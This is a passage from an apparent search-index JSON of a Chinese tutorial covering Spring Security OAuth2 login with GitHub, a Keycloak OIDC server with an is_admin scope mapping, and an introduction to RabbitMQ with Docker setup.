scope\uff0c\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3002 OIDC \u8fd8\u80fd\u751f\u4ea7\u7528\u6237\u4ee4\u724c\uff0c\u7528\u4e8e\u7528\u6237\u8ba4\u8bc1\u3002","title":"OIDC"},{"location":"15/#spring-security-oauth2","text":"\u9996\u5148\u6211\u4eec\u4ecb\u7ecd\u5982\u4f55\u5728 Spring Security \u4e2d\u914d\u7f6e OAuth2 \u5ba2\u6237\u7aef\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u4f1a\u4f7f\u7528 GitHub \u4f5c\u4e3a\u6388\u6743\u670d\u52a1\u5668\u3002\u7531\u4e8e\u5728\u540e\u7aef\u5f00\u53d1\u4e2d\uff0c\u51e0\u4e4e\u53ea\u4f1a\u7528\u5230\u6388\u6743\u7801\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u4ecb\u7ecd\u8fd9\u4e00\u79cd\u6a21\u5f0f\u3002 \u9996\u5148\uff0c\u52a0\u5165\u4f9d\u8d56\uff0c implementation 'org.springframework.boot:spring-boot-starter-oauth2-client' \u7136\u540e\u5220\u9664\u5176\u5b83\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u6dfb\u52a0 OAuth2 \u767b\u9646\uff0c @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { SecurityWebFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .oauth2Login(Customizer.withDefaults()) // .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); return chain; } \u4f7f\u7528 GitHub \u7684\u6388\u6743\u670d\u52a1\u5668\uff0c\u9700\u8981\u5411 GitHub \u7533\u8bf7\u4e00\u4e2a OAuth2 \u5e94\u7528\uff0c\u83b7\u53d6 Client ID \u548c Client Secret\u3002\u7533\u8bf7\u5730\u5740\u5728 \u6b64\u5904 \uff0ccallback URL \u5fc5\u987b\u586b\u5199 {baseUrl}/login/oauth2/code/{registrationId} \uff0c\u73b0\u5728\u5373 http://localhost:8080/login/oauth2/code/github \u3002\u8fd9\u4e2a URL \u662f\u6388\u6743\u670d\u52a1\u5668\u91cd\u5b9a\u5411\u5230\u5ba2\u6237\u7aef\u7684 URL\uff0c\u5373\u63a5\u6536\u6388\u6743\u7801\u7684 URL\uff1bhomepage URL \u586b\u5199 http://localhost:8080 \uff0c\u8fd9\u4e2a URL \u53ea\u662f\u7528\u4e8e homepage \u68c0\u67e5\uff0c\u4f8b\u5982\u63d0\u4f9b\u7ed9 GitHub \u67e5\u770b\u662f\u5426\u5c5e\u4e8e GitHub \u8ba4\u8bc1\u7684\u5e94\u7528\u7b49\u3002\u5982\u679c\u4fee\u6539\u4e86\u7aef\u53e3\u8981\u4e00\u5e76\u4fee\u6539\u3002 \u7136\u540e\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: security: oauth2: client: registration: github: clientId: ${clientId} clientSecret: ${clientSecret} \u4e4b\u540e\u518d\u8bbf\u95ee http://localhost:8080/resource/private \uff0c\u4f1a\u91cd\u5b9a\u5411\u5230 GitHub \u767b\u9646\u9875\u9762\u3002\u6388\u6743\u767b\u9646\u540e\uff0c\u4f1a\u91cd\u5b9a\u5411\u5230 http://localhost:8080/login/oauth2/code/github \uff0c\u7136\u540e\u518d\u91cd\u5b9a\u5411\u5230 http://localhost:8080/resource/private \uff0c\u5e76\u8fd4\u56de\u8d44\u6e90\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u5b9e\u73b0\u4e86 OAuth2 \u6388\u6743\u7801\u6a21\u5f0f\u7684\u5ba2\u6237\u7aef\u3002\u4e4b\u524d URL \u4e2d\u7684 code \u4e5f\u5c31\u4ee3\u8868\u4e86\u6388\u6743\u7801\u6a21\u5f0f\u3002\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u90fd\u5df2\u7ecf\u88ab\u5904\u7406\u597d\u4e86\uff0c\u4e0d\u5fc5\u6211\u4eec\u8fc7\u591a\u5173\u6ce8\u3002","title":"Spring Security OAuth2 \u6388\u6743\u7801\u6a21\u5f0f\u767b\u9646"},{"location":"15/#oidc_1","text":"\u6388\u6743\u670d\u52a1\u5668\u6709\u8bb8\u591a\u9009\u62e9\uff0c\u53ef\u4ee5\u7528 SaaS\uff0c\u4f8b\u5982 Auth0\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 KeyClock\u3002\u5176 Docker \u955c\u50cf\u5728 \u6b64\u5904 \u3002 services: keyclock: image: keycloak/keycloak environment: - KEYCLOAK_ADMIN=admin - KEYCLOAK_ADMIN_PASSWORD=pwd ports: - 8080:8080 command: start-dev \u542f\u52a8\u540e\uff0c\u9996\u5148\u5728\u5de6\u4e0a\u89d2\u70b9\u51fb\u4e0b\u62c9\u6846\uff0c\u521b\u5efa\u4e00\u4e2a Realm\uff0c\u4e00\u4e2a Realm \u5373\u4e00\u4e2a\u72ec\u7acb\u7684\u6388\u6743\u670d\u52a1\u5668\u3002\u7136\u540e\u5728\u5de6\u4fa7\u9009\u62e9 Clients\uff0c\u521b\u5efa\u4e00\u4e2a Client\uff0cClient ID \u5373\u5ba2\u6237\u7aef ID\uff0cClient Secret \u5373\u5ba2\u6237\u7aef\u5bc6\u7801\u3002\u7136\u540e\u5728\u5de6\u4fa7\u9009\u62e9 Users\uff0c\u521b\u5efa\u4e00\u4e2a\u7528\u6237\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u5373\u4e3a\u7528\u6237\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u7136\u540e\u5728\u5de6\u4fa7 clients \u91cc\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Client\u3002 \u540d\u5b57\u4efb\u610f\uff0c\u5176\u5b83\u4fe1\u606f\u9ed8\u8ba4\u5373\u53ef\u3002 \u7136\u540e\uff0c\u5c06 Access Settings \u4e2d Root URL \u8bbe\u7f6e\u597d\u3002\u76ee\u524d\u53ef\u4ee5\u968f\u610f\u8bbe\u7f6e\uff0c\u4f46\u662f\u4e4b\u540e\u7684 Callback URL \u5fc5\u987b\u4e0e\u8fd9\u4e2a Root URL \u6709\u4e00\u6837\u7684\u6839\u57df\u540d\u3002 \u7136\u540e\u5728\u5de6\u4fa7 Users \u91cc\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7528\u6237\u3002\u518d\u70b9\u8fdb\u65b0\u521b\u5efa\u7684\u7528\u6237\uff0c\u9009\u62e9 Credential \u754c\u9762\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\u3002 \u518d\u8fdb\u5165\u5de6\u4fa7 Realm Settings\uff0c\u5728\u6700\u4e0b\u65b9\u627e\u5230 Endpoint\uff0c\u70b9\u8fdb\u53bb\u540e\u4f1a\u770b\u5230\u4e00\u4e2a json \u5bf9\u8c61\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\uff0c {\"issuer\":\"http://localhost:8080/realms/demo\",\"authorization_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/auth\",\"token_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/token\",\"introspection_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/token/introspect\",\"userinfo_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/userinfo\",\"end_session_endpoint\":\"http://localhost:8080/realms/demo/protocol/openid-connect/logout\",\"frontchannel_logout_session_supported\":true,\"frontchannel_logout_supported\":true,\"jwks_uri\":\"http://localhost:8080/realms/demo/protocol/openid-connect/certs\",\"check_session_iframe\": ...} \u8fd9\u91cc\u7684 authorization_endpoint \u5c31\u662f\u6388\u6743\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c token_endpoint \u5c31\u662f\u83b7\u53d6 Token \u7684\u5730\u5740\u3002\u4e0b\u9762\u6211\u4eec\u4f1a\u7528\u5230\u7684\u76f8\u5173\u4fe1\u606f\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c31\u5df2\u7ecf\u53ef\u4ee5\u7528\u4e0a\u9762\u4ecb\u7ecd\u7684\u65b9\u5f0f\u8bf7\u6c42\u6388\u6743\u670d\u52a1\u5668\u4e86\u3002\u4e0a\u9762\u7684 Json \u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u6388\u6743\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u548c token \u7684\u83b7\u53d6\u5730\u5740\u3002 \u8981\u6dfb\u52a0\u6216\u5220\u9664\u7528\u6237\u7b49\u64cd\u4f5c\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 KeyClock \u7684 REST API \u6765\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"\u521b\u5efa OIDC \u6388\u6743\u670d\u52a1\u5668"},{"location":"15/#oidc_2","text":"\u73b0\u5728\u5728 Spring \u9879\u76ee\u4e2d\uff0c\u53ea\u9700\u8981\u5c06\u4e4b\u524d\u7684 Client \u6362\u6389\u5373\u53ef\u3002\u5728 application.yml \u4e2d\u914d\u7f6e\uff0c spring: security: oauth2: client: registration: keycloak: clientId: ${clientId} clientSecret: ${clientSecret} clientName: keycloak provider: keycloak redirectUri: \"{baseUrl}/login/oauth2/code/{registrationId}\" authorizationGrantType: authorization_code scope: openid provider: keycloak: authorizationUri: http://localhost:8080/realms/demo/protocol/openid-connect/auth tokenUri: http://localhost:8080/realms/demo/protocol/openid-connect/token jwkSetUri: http://localhost:8080/realms/demo/protocol/openid-connect/certs userInfoUri: http://localhost:8080/realms/demo/protocol/openid-connect/userinfo userNameAttribute: preferred_username \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 client \u5b57\u6bb5\u4e4b\u524d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u3002\u8fd9\u91cc\u7684 provider \u662f\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u7684\u5730\u5740\uff0c jwkSetUri \u662f\u63d0\u4f9b JWT \u7684\u5730\u5740\uff0c userInfoUri \u662f\u63d0\u4f9b\u7528\u6237\u4fe1\u606f\u7684\u5730\u5740\uff0c userNameAttribute \u662f\u7528\u6237\u4fe1\u606f\u4e2d\u7684\u7528\u6237\u540d\u5b57\u6bb5\u3002\u8fd9\u4e9b\u5b57\u6bb5\u90fd\u53ef\u4ee5\u5728\u4e0a\u9762\u7684 Endpoint \u4e2d\u627e\u5230\u3002\u6b64\u5916\uff0c\u5c3d\u7ba1\u6211\u4eec\u7684 scope \u662f\u7528\u7684\u9ed8\u8ba4\u7684\uff0c\u4f46\u4e0d\u80fd\u7701\u7565\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u76ee\u524d\uff0c\u6211\u4eec\u8fd8\u6ca1\u7ed9\u7528\u6237\u63d0\u4f9b\u591a\u4f59\u7684\u4fe1\u606f\u3002\u73b0\u5728\u5728 KeyCloak \u7684 Client Scope \u91cc\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Scope\uff0c\u6253\u5f00 include in token scope\u3002\u8fd9\u6837\u4f1a\u5728\u8ba4\u8bc1\u65f6\u5c31\u53ef\u4ee5\u540c\u65f6\u5728 JWT \u91cc\u8fd4\u56de\u8fd9\u6761\u4fe1\u606f\u3002 \u7136\u540e\uff0c\u4e3a\u5b83\u521b\u5efa\u4e00\u4e2a Mapper\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 User Attribute\u3002\u8fd9\u91cc\u6211\u4eec\u6240\u6709\u7684 key \u7edf\u4e00\u7528 is_admin \u3002\u8fd9\u6837\uff0cJWT \u4e2d is_admin \u7684\u503c\u4f1a\u88ab\u6620\u5c04\u5230\u7528\u6237\u7684 is_admin \u5c5e\u6027\u3002\u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0cJWT \u4e2d Claim \u540d\u4e3a Token Claim Name \u7684\u4f1a\u88ab\u6620\u5c04\u5230\u7528\u6237\u7684 User Attribute Name\u3002 \u8981\u7ed9\u7528\u6237\u8bbe\u5b9a Attribute\uff0c\u9700\u8981\u628a\u7528\u6237\u52a0\u5165\u7ec4\u4e2d\uff0c\u7136\u540e\u5728\u7ec4\u91cc\u8bbe\u7f6e Scope \u7684\u503c\u3002\u8fd9\u6837\u7528\u6237\u5c31\u4f1a\u6709\u8fd9\u4e2a Scope \u7684\u503c\u4e86\u3002 \u7136\u540e\u5728 Members \u91cc\uff0c\u628a admin \u52a0\u8fdb\u53bb\u3002 \u6700\u540e\uff0c\u5728 Client \u91cc\uff0c\u5c06\u8fd9\u4e2a Scope \u52a0\u8fdb\u53bb\u3002 \u8fd9\u91cc\u5982\u679c\u8bbe\u7f6e\u7684 Default\uff0c\u8bf7\u6c42\u65f6\u5c31\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8fd9\u4e2a Scope\u3002\u5982\u679c\u8bbe\u7f6e\u7684 Optional\uff0c\u8bf7\u6c42\u65f6\u4f1a\u6839\u636e Scope \u53c2\u6570\u6765\u51b3\u5b9a\u662f\u5426\u52a0\u4e0a\u8fd9\u4e2a Scope\u3002 \u73b0\u5728\u8fdb\u5165\u5230 Client Scope \u7684 Evaluate \u754c\u9762\uff0c\u53ef\u4ee5\u770b\u5230 token \u91cc\u5df2\u7ecf\u80fd\u6b63\u786e\u8fd4\u56de is_admin \u4e86\u3002 \u73b0\u5728\uff0c\u4fee\u6539\u4e00\u4e0b FilterChain \u5373\u53ef\u3002Spring Security \u81ea\u52a8\u628a Authorities \u8bbe\u7f6e\u4e3a SCOPE_{name} \uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7\u5224\u65ad\u67d0\u4e2a Scope \u662f\u5426\u5b58\u5728\u6765\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u3002 @Configuration @EnableWebFluxSecurity public class SecurityConfig { @Bean SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) { http .oauth2Login(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasAnyAuthority(\"SCOPE_is_admin\") .anyExchange().permitAll() ); return http.build(); } } \u73b0\u5728\uff0c\u5c31\u80fd\u901a\u8fc7 /resource/admin \u6765\u8bbf\u95ee\u9700\u8981 is_admin Scope \u7684\u8d44\u6e90\u4e86\u3002","title":"\u4f7f\u7528 OIDC \u6388\u6743\u670d\u52a1\u5668"},{"location":"16/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch16 Rabbit MQ \u4ece\u8fd9\u7ae0\u8d77\uff0c\u6211\u4eec\u7684\u6807\u9898\u892a\u53bb Spring\uff0c\u53d8\u6210\u4e86\u5fae\u670d\u52a1\u901f\u6210\u3002\u76ee\u524d\u6211\u4eec\u4f9d\u7136\u57fa\u4e8e Spring \u6846\u67b6\uff0c\u4f46\u4e5f\u53ea\u662f\u4f17\u591a\u9009\u62e9\u4e4b\u4e00\u3002 Rabbit MQ \u662f\u4e00\u4e2a AMQP \u7684\u6d88\u606f\u961f\u5217\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u5206\u5e03\u5f0f\u7cfb\u7edf\u3002Rabbit MQ \u662f\u4e00\u4e2a\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u7528\u4e8e\u5b58\u50a8\u6d88\u606f\uff0c\u7136\u540e\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u3002 \u4e4b\u6240\u4ee5\u6211\u4eec\u8981\u5f15\u5165\u6d88\u606f\u961f\u5217\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u89e3\u8026\u3002\u5728\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u662f\u901a\u8fc7 HTTP \u5b8c\u6210\u7684\uff0c\u8fd9\u6837\u5c31\u4f1a\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u662f\u540c\u6b65\u7684\u3002\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u6302\u4e86\uff0c\u90a3\u4e48\u8c03\u7528\u8005\u5c31\u4f1a\u7b49\u5f85\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u6574\u4e2a\u670d\u52a1\u90fd\u6302\u6389\u3002\u800c\u6d88\u606f\u961f\u5217\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\uff0c\u5b83\u662f\u5f02\u6b65\u7684\uff0c\u5373\u751f\u4ea7\u8005\u751f\u4ea7\u6d88\u606f\u540e\u5c31\u4e0d\u7ba1\u4e86\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\uff0c\u8fd9\u6837\u5c31\u89e3\u8026\u4e86\u3002\u6b64\u5916\uff0c\u6d88\u606f\u961f\u5217\u8fd8\u6709\u9500\u5cf0\u7684\u529f\u80fd\uff0c\u5373\u5728\u9ad8\u5cf0\u671f\uff0c\u6d88\u606f\u961f\u5217\u53ef\u4ee5\u7f13\u5b58\u6d88\u606f\uff0c\u7136\u540e\u5728\u4f4e\u5cf0\u671f\u6d88\u8d39\uff0c\u8fd9\u6837\u589e\u5f3a\u4e86\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u3002\u5f53\u7136\uff0c\u5f15\u5165\u65b0\u7684\u4e2d\u95f4\u4ef6\u80af\u5b9a\u4f1a\u589e\u52a0\u590d\u6742\u5ea6\u548c\u4e0d\u7a33\u5b9a\u6027\uff0c\u56e0\u6b64\u8981\u6743\u8861\u3002 \u76f8\u6bd4\u5176\u5b83\u7684\u6d88\u606f\u961f\u5217\uff0cRabbit MQ \u6709\u4e00\u4e2a\u4f18\u70b9\uff0c\u5c31\u662f\u5b83\u662f AMQP \u7684\u5b9e\u73b0\u3002AMQP \u662f\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u7684\u6807\u51c6\uff0c\u5b83\u89c4\u5b9a\u4e86\u6d88\u606f\u961f\u5217\u7684\u683c\u5f0f\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u540c\u6d88\u606f\u961f\u5217\u4e4b\u95f4\u7684\u517c\u5bb9\u6027\u3002\u56e0\u6b64\uff0cRabbit MQ \u53ef\u4ee5\u548c\u5176\u5b83\u7684\u6d88\u606f\u961f\u5217\u517c\u5bb9\u3002Rabbit MQ \u4e5f\u6709\u5176\u5b83\u7684\u4f18\u70b9\uff0c\u4f8b\u5982\uff0c\u5b83\u652f\u6301\u96c6\u7fa4\uff0c\u652f\u6301\u6301\u4e45\u5316\uff0c\u652f\u6301\u4e8b\u52a1\uff0c\u652f\u6301\u63d2\u4ef6\u7b49\u3002\u8fd9\u4e9b\u4e30\u5bcc\u7684\u7279\u6027\u4f7f\u5f97\u5b83\u5e38\u7528\u4e8e\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\u3002 \u6ce8\u610f\uff0c\u5230\u4e86\u8fd9\u4e00\u7ae0\u5f00\u59cb Java \u8bed\u8a00\u548c Spring \u6846\u67b6\u7684\u91cd\u8981\u6027\u4f1a\u9010\u6e10\u6de1\u5316\u3002\u5c3d\u7ba1\u73b0\u5728\u6211\u4eec\u8fd8\u662f\u4ee5 Spring \u6846\u67b6\u4e3a\u57fa\u7840\u8bb2 Rabbit MQ\uff0c\u4f46 Rabbit MQ \u5176\u5b9e\u517c\u5bb9\u5f88\u591a\u8bed\u8a00\u548c\u6846\u67b6\u3002\u4e4b\u540e\u7684\u6280\u672f\uff0c\u4f8b\u5982 graphQL \u548c gRPC\uff0c\u4e5f\u662f\u5982\u6b64\u3002\u800c\u5728\u6700\u540e\u4e00\u90e8\u5206 k8s \u4e2d\uff0c\u4e3a\u4e86\u5f00\u53d1\u6548\u7387\uff0c\u6211\u4eec\u5c06\u4f1a\u8f6c\u5411\u5176\u5b83\u8bed\u8a00\u548c\u6846\u67b6\u3002\u6b64\u5916\uff0c\u524d\u9762\u5b66\u4e60\u7684 Consul \u4e5f\u662f\u8fd9\u6837\u3002 \u57fa\u672c\u6982\u5ff5 \u6d88\u606f\u961f\u5217\u4e2d\uff0c\u7ecf\u5e38\u8ba8\u8bba\u4ee5\u4e0b\u51e0\u4e2a\u6982\u5ff5\uff0c \u751f\u4ea7\u8005\uff08Producer\uff09\uff1a\u751f\u4ea7\u6d88\u606f\u7684\u670d\u52a1\uff0c\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Publisher \u6d88\u8d39\u8005\uff08Consumer\uff09\uff1a\u6d88\u8d39\u6d88\u606f\u7684\u670d\u52a1\uff0c\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Subscriber \u961f\u5217\uff08Queue\uff09\uff1a\u5b58\u50a8\u6d88\u606f\u7684\u5730\u65b9\uff0c\u751f\u4ea7\u8005\u751f\u4ea7\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f AMQP\uff1aAdvanced Message Queuing Protocol\uff0c\u6d88\u606f\u961f\u5217\u7684\u534f\u8bae\uff0cRabbit MQ \u5c31\u662f AMQP \u7684\u5b9e\u73b0 \u901a\u9053\uff08channel\uff09\uff1a\u751f\u4ea7\u8005\u548c\u6d88\u8d39\u8005\u4e4b\u95f4\u7684\u901a\u9053\uff0c\u751f\u4ea7\u8005\u901a\u8fc7\u901a\u9053\u53d1\u9001\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u901a\u8fc7\u901a\u9053\u6d88\u8d39\u6d88\u606f \u4ea4\u6362\u673a\uff08Exchange\uff09\uff1a\u8f6c\u53d1\u6d88\u606f\u7684\u5730\u65b9\uff0c\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217 Rabbit MQ \u516d\u5927\u6a21\u578b Rabbit MQ \u63d0\u4f9b\u4e86\u516d\u79cd\u5e38\u89c1\u7684\u6d88\u606f\u961f\u5217\u4e0e\u4ea7\u9500\u8005\u7684\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5305\u62ec\uff0c \u7f13\u51b2\u961f\u5217\uff08Buffer\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u5355\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u4ece\u961f\u5217\u4e2d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u53ea\u8d77\u5230\u7f13\u51b2\u8bf7\u6c42\u7684\u4f5c\u7528\u3002 \u5de5\u4f5c\u961f\u5217\uff08Work Queue\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u4ece\u961f\u5217\u4e2d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u4f5c\u7528\u3002 \u6247\u51fa\u4ea4\u6362\u673a\uff08Fanout Exchange\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u591a\u4e2a\u961f\u5217\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6240\u6709\u7684\u961f\u5217\uff0c\u6bcf\u4e2a\u961f\u5217\u6709\u4e00\u4e2a\u6d88\u8d39\u8005\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u5e7f\u64ad\u7684\u4f5c\u7528\u3002 \u8def\u7531\u4ea4\u6362\u673a\uff08Direct Exchange\uff09\uff1a\u4e0e\u6247\u51fa\u4ea4\u6362\u673a\u7c7b\u4f3c\uff0c\u4f46\u662f\uff0c\u6d88\u606f\u4f1a\u9644\u5e26\u4e00\u4e2a routing key\uff0c\u4ea4\u6362\u673a\u4f1a\u6839\u636e routing key \u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8def\u7531\u7684\u4f5c\u7528\u3002 \u4e3b\u9898\u4ea4\u6362\u673a\uff08Topic Exchange\uff09\uff1a\u4e0e\u8def\u7531\u4ea4\u6362\u673a\u7c7b\u4f3c\uff0c\u4f46\u662f\uff0crouting key \u662f\u4e00\u4e2a\u901a\u914d\u7b26\uff0c\u4ea4\u6362\u673a\u4f1a\u6839\u636e\u901a\u914d\u7b26\u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u4f9d\u7136\u662f\u8def\u7531\u7684\u4f5c\u7528\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\uff1a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u540e\uff0c\u518d\u53d1\u9001\u6d88\u606f\u5230\u53e6\u4e00\u4e2a\u961f\u5217\uff0c\u751f\u4ea7\u8005\u518d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86 RPC \u7684\u4f5c\u7528\u3002 \u5176\u4e2d\uff0c\u6247\u51fa\u4ea4\u6362\u673a\uff0c\u8def\u7531\u4ea4\u6362\u673a\u4e0e\u4e3b\u9898\u4ea4\u6362\u673a\u7edf\u79f0\u4e3a\u8ba2\u9605\u53d1\u5e03\u6a21\u5f0f\uff08Publish/Subscribe\uff09\uff0c\u5b83\u4eec\u662f\u6d88\u606f\u961f\u5217\u4e2d\u6700\u5e38\u89c1\u7684\u6a21\u5f0f\u3002 \u9879\u76ee\u914d\u7f6e \u4f9d\u7136\u4f7f\u7528 docker \u6765\u542f\u52a8 Rabbit MQ\uff0c services: rabbitmq: image: rabbitmq:4.0-rc-management environment: - RABBITMQ_DEFAULT_USER=user - RABBITMQ_DEFAULT_PASS=password ports: - 15672:15672 - 5672:5672 15672 \u662f\u7ba1\u7406\u7684 WebUI\uff0c 5672 \u662f AMQP \u7684\u7aef\u53e3\u3002 \u4e0b\u6587\u4e2d\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 admin \u8d26\u6237\uff0c\u4f46\u662f\u4e3a\u4e86\u5b89\u5168\uff0c\u6700\u597d\u8fd8\u662f\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8d26\u6237\u3002 Rabbit MQ \u7ba1\u7406\u754c\u9762 Rabbit MQ \u7ba1\u7406\u754c\u9762\u53ef\u4ee5\u8fdb\u884c\u6d88\u606f\u7684\u67e5\u770b\uff0c\u961f\u5217\u7684\u67e5\u770b\uff0c\u7528\u6237\u7684\u7ba1\u7406\u7b49\u3002\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 http://localhost:15672 \uff0c\u8f93\u5165\u8d26\u6237\u5bc6\u7801\uff0c\u5373\u53ef\u8fdb\u5165\u7ba1\u7406\u754c\u9762\u3002\u521b\u5efa\u7528\u6237\u5f88\u7b80\u5355\uff0c\u8f93\u5165\u7528\u6237\u540d\uff0c\u5bc6\u7801\u548c\u6743\u9650\u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u53ea\u6709 Admin \u6216\u8005 Management \u6743\u9650\u7684\u7528\u6237\u624d\u80fd\u8fdb\u5165\u7ba1\u7406\u754c\u9762\u3002 \u6b64\u5916\uff0cRabbit MQ \u6709\u4e00\u4e2a\u529f\u80fd\uff0c\u53eb Virtual Host\uff0c\u8fd9\u662f\u7528\u6765\u9694\u79bb\u4e0d\u540c\u7684\u670d\u52a1\u7684\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e8e\u6570\u636e\u5e93\u4e2d\uff0c\u5148\u5206\u5e93\uff0c\u518d\u5206\u8868\u3002\u5728 Rabbit MQ \u4e2d\uff0c\u5148\u5206 Virtual Host\uff0c\u518d\u5206 